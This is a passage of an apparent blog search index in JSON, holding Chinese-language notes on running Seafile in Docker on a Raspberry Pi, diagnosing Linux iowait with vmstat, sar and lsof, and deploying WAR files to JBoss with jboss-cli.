初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"相關其他搜尋 以下幾乎是資料夾內容同步，目前沒使用就先不研究 Sharry：一个非常好用的文件分享程序-荒岛 ResilioSync：公私兼备的同步盘-荒岛 使用Syncthing自建私有同步盘-荒岛 Dropit：一个简洁的文件上传工具-荒岛 CozyCloud：基于GO语言开发的网盘/同步盘-荒岛 CozyCloud 是 Golang 寫的，沒有音樂播放功能，感覺跟 seafile 差不多 之後會再嘗試看看，主要看有沒有不加密檔案功能 ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:1:0","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"Seafile ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:2:0","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"優點、缺點 優點 速度比 NextCloud 快 基本檔案上傳管理功能都有 可以編輯 Markdown 檔案 我目前只想到這樣 = =a 但這個就夠讓人跳了 缺點 NextCloud 很多功能都沒有 (DLNA,Media Hub) 檔案上傳一定會做加密，不能手動關掉(聽說是為了做歷程關係) 上傳大檔案可能 PI 會等很久(可能再加密部分) 我有測試 1GB 大概也要卡很久 ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:2:1","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"音樂解決方案 Clementine 音樂播放器 裝這個撥放器可以跟 Seafile 串接 目前介面還算能接受 音樂不會全部抓到硬碟 這個可能我還滿需要這樣的 我有看到他有支援 Subsonic 但是我使用覺得介面不是很好用用 大缺點就是需要安裝撥放器 ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:2:2","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"輕鬆使用 docker 體驗 Seafile ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:3:0","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"build images # 請使用 Root 權限，官網是這樣說的。但我看裡面語法沒什麼問題 # 感覺怕權限失敗 git clone https://github.com/domenukk/seafile-docker-pi.git cd ./seafile-docker-pi/image make base \u0026\u0026 make server ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:3:1","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"run docker run -d --name seafile \\ -e SEAFILE_SERVER_HOSTNAME=192.168.1.202:8888 \\ -p 8888:80 \\ seafileltd/seafile:pi 因為我 80 已經有用 NextCloud 執行會有點久，你看他的 log 看起來完成 其實還沒有跑完，等一回就好了 https 下次應該會考慮就 Caddy 去做反向代理 Traefik 搭配 Docker 自動更新 Let’s Encrypt 憑證 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY 不過也有考慮使用 Traefik 預設帳號密碼是 me@example.com / asecret 相關教學用Docker部署 Seafile 服务 - Seafile服务器手册中文版 自訂密碼 docker run -d --name seafile \\ -e SEAFILE_SERVER_HOSTNAME=seafile.example.com \\ -e SEAFILE_ADMIN_EMAIL=me@example.com \\ -e SEAFILE_ADMIN_PASSWORD=a_very_secret_password \\ -v /opt/seafile-data:/shared \\ -p 80:80 \\ seafileltd/seafile:pi Let’s encrypt SSL certificate docker run -d --name seafile \\ -e SEAFILE_SERVER_LETSENCRYPT=true \\ -e SEAFILE_SERVER_HOSTNAME=seafile.example.com \\ -e SEAFILE_ADMIN_EMAIL=me@example.com \\ -e SEAFILE_ADMIN_PASSWORD=a_very_secret_password \\ -v /opt/seafile-data:/shared \\ -p 80:80 \\ -p 443:443 \\ seafileltd/seafile:pi 修改設定重啟 Seafile 設定檔路徑 shared/seafile/conf docker restart seafile 加一個管理者 docker exec -it seafile /opt/seafile/seafile-server-latest/reset-admin.sh 檔案路徑 /shared 為根路徑 -v /opt/seafile-data:/shared docker run -d --name seafile \\ -e SEAFILE_SERVER_HOSTNAME=192.168.1.202:8888 \\ -p 8888:80 \\ -v /media/USBdrive/seafile-data:/shared \\ seafileltd/seafile:pi 垃圾回收 docker exec seafile /scripts/gc.sh. ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:3:2","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"其他相關文章 树莓派部署 seafile 和 nextcloud 比较 - 知乎 domenukk/seafile-docker-pi: A Docker image for Seafile server - Raspberry Pi Edition 开源的私有云网盘程序Seafile安装教程-荒岛 ","date":"2020-10-12","objectID":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/:3:3","tags":["seafile","nextcloud"],"title":"Raspberry Pi 使用 Seafile 初體驗","uri":"/blog/posts/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Seafile-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"最近除了看 CPU 使用率過高 之前 Raspberry Pi 使用 NextCloud 的時候速度非常慢 一直以為是 CPU 關係，但後來發現不是 官網友提到是 IO 效能關係 一直以為 IO 效能跟硬碟有關係 但後來研究一翻，參考網路上一些文章 後來 CPU, RAM, Network … 等等都有關係 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:0:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"IO 效能怎麼看? Linux 性能监控 —— 磁盘 I/O_wenniuwuren-CSDN博客 二. 如何衡量磁盤 I/O 存在瓶頸 磁盤 I/O 是否存在瓶頸取決於當前機器 CPU 的總核數（總核數計算移步我的另一篇博文: Linux 性能監控 —- Load Average）。 公式： X(IO) = 1/（cpu 總核數） 用來衡量磁盤 I/O 情況， 以上圖的機器為例子， 這台機器 2 CPU 12 核 也就是總核心數為 2*12 = 24， X(IO) = 0.04166666 = 4.17%。 如果上圖指標長時間大於 4.17%， 那麼我們的網站響應可能就會變慢了。 簡單來說就是 top CPU 那一行 13 wa 那一行 X(IO) = 1/（cpu 總核數） 我樹莓派沒有使用百分比，不過他這邊應該沒放 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:1:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"IO 測試方法 blog.toright.com/posts/5051/linux-disk-io-效能測試.html/amp 使用最簡單方法 dd if=/dev/zero of=/tmp/bench bs=1M count=1024 \u0026\u0026 rm /tmp/bench 在樹莓派使用 SD 做 wa有到 0.25 左右，不過改在 USB 上面 wa到 0.5 上下，CPU 雖然沒有吃很高 但是這時候很明顯感覺 pietty 操作跟重新開市窗操作連線會變慢 看來程式處理速度跟這個數字也有關 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:2:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"安裝 iostat sudo apt install sysstat 解決 iostat command not found linux wa%過高，iostat查看io狀況 - 測試天堂 - 51Testing軟件測試網 51Testing軟件測試網-軟件測試人的精神家園 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:3:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"wa 高不一定是出在硬碟 io 傲笑紅塵路: 監控Linux 系統效能狀況 備份圖 可能是網路等等其他 這邊有查到 sar 可以查詢 CPU, RAM, Disk I/O, Network 網路查詢方法 使用sar工具进行cpu/mem/io/network等性能分析_@_囚徒-2018_的家园-CSDN博客 12. sar 找出系统瓶颈的利器 — Linux Tools Quick Tutorial 记一次服务端 IO 瓶颈问题定位 · TesterHome 使用 sar 記錄系統資源使用狀態 | TechNote 菜鳥工程師 肉豬: Linux htop 系統程序監控工具簡介 7 個實例教你使用 sar 命令生成CPU、內存和輸入輸出埠的報告 | Linux Story 如何在Raspberry Pi 用USB碟開機 – Wayne’s Garden 案例：系统的 CPU 使用率很高，但为啥却找不到高 CPU 的应用？ | Laravel China 社区 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:4:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"20201004 查 Raspberry pi 的 top CPU 異常飆高 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:5:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"PI 環境簡單介紹 之前有使用 rclone 掛載 Google 雲端硬碟 但是最近使用 ftp(vsftpd)下載完檔案 發現 wa CPU 標高 (中途有遇到我的D朝下載超過容量關係，其他下載失敗) swap 也吃了 80MB(總共 100 MB) swap 應該可能是因為我 rclone 掛載模式關係 wa 沒有降下來原因我覺得要找一下 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:5:1","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"用上面指令查詢經過(可跳過這篇) 這邊有使用 SAR 查看 pi@PI203:~ $ sar -r 2 5 Linux 4.19.118-v7+ (PI203) 2020年10月03日 _armv7l_ (4 CPU) 03時32分26秒 kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 03時32分28秒 89612 642628 238560 25.16 14860 522124 777284 73.98 185960 542316 0 03時32分30秒 89612 642628 238560 25.16 14860 522124 777284 73.98 186020 542316 0 03時32分32秒 89604 642620 238568 25.16 14860 522124 777284 73.98 186020 542316 0 03時32分34秒 89620 642636 238544 25.16 14860 522128 779252 74.17 186252 542320 0 03時32分36秒 89604 642620 238564 25.16 14860 522124 779252 74.17 186108 542316 0 平均時間： 89610 642626 238559 25.16 14860 522125 778071 74.05 186072 542317 0 pi@PI203:~ $ sar -r 2 5 Linux 4.19.118-v7+ (PI203) 2020年10月03日 _armv7l_ (4 CPU) 03時32分41秒 kbmemfree kbavail kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 03時32分43秒 89856 642872 238312 25.13 14860 522124 777832 74.03 185968 542316 0 03時32分45秒 89856 642872 238312 25.13 14860 522124 777832 74.03 185968 542316 0 03時32分47秒 89864 642880 238304 25.13 14860 522124 777832 74.03 185968 542316 0 03時32分49秒 89864 642880 238304 25.13 14860 522124 777832 74.03 185968 542316 0 03時32分51秒 89864 642880 238304 25.13 14860 522124 777832 74.03 185968 542316 0 平均時間： 89861 642877 238307 25.13 14860 522124 777832 74.03 185968 542316 0 這邊 commit 怪怪的，網路查好像 commit 需要大於 100% %commit 當前需要的內存/RAM+swap，要保證大於100%，因為內核通常都overcommit內存。 从vmstat命令里看服务器瓶颈 | Chris Chan’s BLOG vmstat 的用法和判别系统瓶颈_RisenWang 的博客-CSDN博客 pi@PI203:~ $ vmstat 1 20 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 1 85568 89920 14888 559472 0 0 2 1 3 2 1 1 98 1 0 0 1 85568 89896 14888 559472 0 0 0 0 178 266 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 175 272 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 164 250 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 202 304 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 183 283 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 180 267 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 161 244 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 166 253 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 177 275 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 190 295 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 188 289 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 179 270 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 177 275 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 175 266 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 164 254 0 0 75 25 0 1 1 85568 89896 14888 559472 0 0 0 0 187 289 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 169 255 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 181 283 0 0 75 25 0 0 1 85568 89896 14888 559472 0 0 0 0 171 248 0 0 75 25 0 這邊wa 這麼高，沒有降下來…這邊 top 應該跟 wa 是一樣的東西 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:6:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"vsftp 程式 uninterruptible sleep 狀態 參照這個shell 找到 vsftp 有問題iowait 过高问题的查找及解决linux | 张志明的个人博客 裡面有提到用 iotop 但我看數字都正常 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:7:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"查看 uninterruptible sleep 程式 # for x in `seq 1 1 10`; do ps -eo state,pid,cmd | grep \"^D\"; echo \"----\"; sleep 5; done D 18634 /usr/sbin/vsftpd /etc/vsftpd.conf ---- D 18634 /usr/sbin/vsftpd /etc/vsftpd.conf ---- 這邊除了這個方法 watch -n 1 \"(ps aux | awk '\\$8 ~ /D/ { print \\$0 }')\" Linux - How can I see what’s waiting for disk IO - Server Fault linux - Find process causing IO wait time - Server Fault iotop 不知道能不能看到 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:7:1","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"lsof -p 18634 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME vsftpd 18634 pi cwd unknown /mnt/gdrive/ACG/TV/202007/沒落要塞 DECA-DENCE (stat: Permission denied) vsftpd 18634 pi rtd DIR 179,2 4096 2 / vsftpd 18634 pi txt REG 179,2 113240 24973 /usr/sbin/vsftpd vsftpd 18634 pi mem REG 179,2 42632 1674 /lib/arm-linux-gnueabihf/libnss_files-2.28.so vsftpd 18634 pi mem REG 179,2 26600 1697 /lib/arm-linux-gnueabihf/librt-2.28.so vsftpd 18634 pi mem REG 179,2 17956 1637 /lib/arm-linux-gnueabihf/libcap-ng.so.0.0.0 vsftpd 18634 pi mem REG 179,2 130416 1693 /lib/arm-linux-gnueabihf/libpthread-2.28.so vsftpd 18634 pi mem REG 179,2 9768 1644 /lib/arm-linux-gnueabihf/libdl-2.28.so vsftpd 18634 pi mem REG 179,2 116032 1580 /lib/arm-linux-gnueabihf/libaudit.so.1.0.0 vsftpd 18634 pi mem REG 179,2 71576 1671 /lib/arm-linux-gnueabihf/libnsl-2.28.so vsftpd 18634 pi mem REG 179,2 1296004 1636 /lib/arm-linux-gnueabihf/libc-2.28.so vsftpd 18634 pi mem REG 179,2 17872 1638 /lib/arm-linux-gnueabihf/libcap.so.2.25 vsftpd 18634 pi mem REG 179,2 2118048 15238 /usr/lib/arm-linux-gnueabihf/libcrypto.so.1.1 vsftpd 18634 pi mem REG 179,2 454924 15239 /usr/lib/arm-linux-gnueabihf/libssl.so.1.1 vsftpd 18634 pi mem REG 179,2 50896 2417 /lib/arm-linux-gnueabihf/libpam.so.0.84.2 vsftpd 18634 pi mem REG 179,2 30508 1715 /lib/arm-linux-gnueabihf/libwrap.so.0.7.6 vsftpd 18634 pi mem REG 179,2 17708 14650 /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so vsftpd 18634 pi mem REG 179,2 138604 1559 /lib/arm-linux-gnueabihf/ld-2.28.so vsftpd 18634 pi 0u sock 0,8 0t0 2903508 protocol: TCPv6 vsftpd 18634 pi 1u sock 0,8 0t0 2903508 protocol: TCPv6 vsftpd 18634 pi 2u sock 0,8 0t0 2903508 protocol: TCPv6 vsftpd 18634 pi 3w REG 179,2 37351 1427 /var/log/vsftpd.log.1 vsftpd 18634 pi 4r unknown /mnt/gdrive/ACG/TV/202007/沒落要塞 DECA-DENCE/[Airota][Deca-Dence][05][1080p AVC AAC][CHT].mp4 (stat: Permission denied) vsftpd 18634 pi 5u unix 0x97115dd6 0t0 2898890 type=STREAM vsftpd 18634 pi 6u sock 0,8 0t0 2907724 protocol: TCPv6 這邊查了一下 產生D狀態的原因出現uninterruptible sleep狀態的進程一般是因為在等待IO，例如磁盤IO、網絡IO等。在發出的IO請求得不到相應之後，進程一般就會轉入uninterruptible sleep狀態，例如若NFS服務端關閉時，如果沒有事先amount相關目錄。在客戶端執行df的話就會掛住整個會話，再用ps axf查看的話會發現df進程狀態位已經變成D。 Linux 進程的 Uninterruptible sleep(D) 狀態 - Still water run deep - 開發者的網上家園 vmstat 可以看到 第二個 b 確實我顯示有 1(可參照上面) 由於只有運行狀態的進程才可以接受信號，所以處於uninterruptible sleep的進程，是無法用kill命令殺掉的，即使是加9或15的信號。 但要該怎麼處理呢? 正是因為得不到IO的響應，進程才進入了uninterruptible sleep狀態，所以要想使進程從uninterruptible sleep狀態恢復，就得使進程等待的IO恢復，比如如果是因為從遠程掛載的NFS卷不可訪問導致進程進入uninterruptible sleep狀態的，那麼可以通過恢復該NFS卷的連接來使進程的IO請求得到滿足，除此之外，要想幹掉處在D狀態進程就只能重啟整個Linux系統（D進程並不能通過kill 和kill -9 殺掉） 。 作者：不穿格子衫的程序猿 链接：https://www.jianshu.com/p/8f29d6d70fd6 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 進程查看命令 - 簡書 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:7:2","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"亂打亂撞解決 網路上說無法kill強制刪掉 這邊我決定 kill 掉看看 一般 kill 無法 但 kill -9 就刪掉了… 這邊就不繼續探討了 top wa 就正常了… 簡單回顧重點 vmstat 第二個 b 可以先確認 uninterruptible sleep程式 再尋找 uninterruptible sleep 程式做處理 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:7:3","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Linux"],"content":"wa 和 id 當前的CPU運行情況： us：非nice用戶進程佔用CPU的比率 sy：內核、內核進程佔用CPU的比率； ni：如果一些用戶進程修改過優先級，這裡顯示這些進程佔用CPU時間的比率； id：CPU空閒比率，如果系統緩慢而這個值很高，說明系統慢的原因不是CPU負載高； wa：CPU等待執行I/O操作的時間比率，該指標可以用來排查磁盤I/O的問題，通常結合wa和id判斷 hi：CPU處理硬件終端所佔時間的比率； si：CPU處理軟件終端所佔時間的比率； st：流逝的時間，虛擬機中的其他任務所佔CPU時間的比率； 用戶進程佔比高，wa低，說明系統緩慢的原因在於進程佔用大量CPU，通常還會伴有教低的id，說明CPU空轉時間很少； wa低，id高，可以排除CPU資源瓶頸的可能。 wa高，說明I/O佔用了大量的CPU時間，需要檢查交換空間的使用，交換空間位於磁盤上，性能遠低於內存，當內存耗盡開始使用交換空間時，將會給性能帶來嚴重影響，所以對於性能要求較高的服務器，一般建議關閉交換空間。另一方面，如果內存充足，但wa很高，說明需要檢查哪個進程佔用了大量的I/O資源。 Linux系统排查2——CPU负载篇 - 王智愚 - 开发者的网上家园 Linux下性能分析工具 | zhqqqy CPU使用率低但負載高 load average 是對 CPU 負載的評估，其值越高，說明其任務隊列越長，處於等待執行的任務越多。但CPU卻在摸魚（idls高），這就說明有可能有很多假死進程，可能寫的程序有等待（I/O）或者睡眠。 作者：Carson_dotnet 链接：https://www.jianshu.com/p/27d8c33e03cf 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 Linux CPU過載判斷以及分析 - 簡書 ","date":"2020-10-03","objectID":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/:8:0","tags":["linux","io"],"title":"Linux IO 效能研究怎麼看","uri":"/blog/posts/Linux-IO-%E6%95%88%E8%83%BD%E7%A0%94%E7%A9%B6%E6%80%8E%E9%BA%BC%E7%9C%8B/"},{"categories":["Java"],"content":"最近公司部署 war 檔程式 總是常常遇到 OOM(Out of Memory) 狀況 這時候有幾個部署必須要想辦法排除 這邊只記錄我排除經驗與猜測 首先，我先講我認知的部署 war 兩個方法 在 $JBOSS_HOME/standalone/deployment 裡面放置 war 檔案就可以部署 另一個方法是用 SE 會用一個方法部署到 JBoss 裡面 但是 $JBOSS_HOME/standalone/deployment 不會看到 war 檔 ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:0:0","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"手動重新部署 假如上的 war 沒有動作 touch jboss-helloworld.war.dodeploy 可以這樣做 ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:1:0","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"異常事件重新部署上到舊程式 首先，我專案用的部署 war 是 Jenkins 因為是 SE 關係，所以我沒辦法看到他設定怎麼部署 但有時候部署程式，需要手動上 war。 最近發生怪事情，就是有時候遇到 OOM ， restart JBoss 會 failed 然後我把 JBoss 的 $JBOSS_HOME/standalone/config/standalone.xml 裡面 deployment tag 我上失敗 war 清掉 舊可以正常打開，但是需要重新上 war 檔 但最近不知道 SE ，他們 Jenkns 有調整? 我 $JBOSS_HOME/standalone/config/standalone.xml ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:0","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"異常事件原因 最近剛好看到 JBoss-cli 這個功能，他可以遠端(Remote)部署 war 感覺 SE 是用這個方式部署 war 首先遠端部署你的 JBoss Server 就要啟動(port 9990) 難怪之前 stop JBoss Server ，用 Jenkns 部署會失敗… 在 local 端使用 $JBOSS_HOME/bin/jboss-cli.sh 進去會看到類似 cli 指令可以輸入 connect xx.xx.xx.xx 就可以進去(沒有設定密碼，會看到 cli 介面) 這時候就可以輸入 deploy xxxx.war(local) 就可以部署 其實我還沒有機會嘗試 ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:2:1","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"這邊疑問 $JBOSS_HOME/standalone/config/standalone.xml 和 jboss-cli deploy 部署會不會衝突? 這邊是我的猜測 然後 $JBOSS_HOME/standalone/config/standalone.xml 裡面的 deployment 可以看到 cli 部署出來 war tag 其實我還沒搞清楚熱部署是什麼 $JBOSS_HOME/standalone/deployment 其實我在懷疑這邊是不是熱部署? 為什麼正式環境改用這jboss-cli 部署呢? ","date":"2020-09-29","objectID":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/:3:0","tags":["jboss"],"title":"JBoss 部署程式和 cli 操作小記","uri":"/blog/posts/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"jboss-cli 指令 deployment-info NAME RUNTIME-NAME PERSISTENT ENABLED STATUS jboss-ejb-in-ear.ear 